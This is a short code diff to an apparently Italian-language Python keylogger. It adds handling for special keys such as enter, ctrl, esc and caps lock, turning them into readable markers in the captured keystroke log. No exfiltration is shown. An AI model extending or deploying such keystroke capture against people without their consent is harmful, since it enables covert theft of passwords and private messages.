@@ -31,6 +31,7 @@ def main():
     checkLogsPath(logsPath)
 
     while True:
+        skip = False
         tempLog = recording()
         strTempLogRaw = str(tempLog)
         strTempLog = ""
@@ -38,6 +39,18 @@ def main():
         if strTempLogRaw.find("down") != -1:
             if strTempLogRaw.find("space") != -1:
                 strTempLog = " "
+            elif strTempLogRaw.find("enter") != -1:
+                strTempLog = "\n"
+            elif strTempLogRaw.find("maiusc") != -1:
+                strTempLog = ""
+            elif strTempLogRaw.find("ctrl") != -1:
+                strTempLog = " [CTRL] "
+            elif strTempLogRaw.find("esc") != -1:
+                strTempLog = " [ESC] "
+            elif strTempLogRaw.find("stamp") != -1:
+                strTempLog = " [STAMP] "
+            elif strTempLogRaw.find("bloc maius") != -1:
+                strTempLog = " [MAIUSCOLO] "
             else:
                 strTempLog = strTempLogRaw.removeprefix("KeyboardEvent(")
                 strTempLog = strTempLog.removesuffix(" down)")
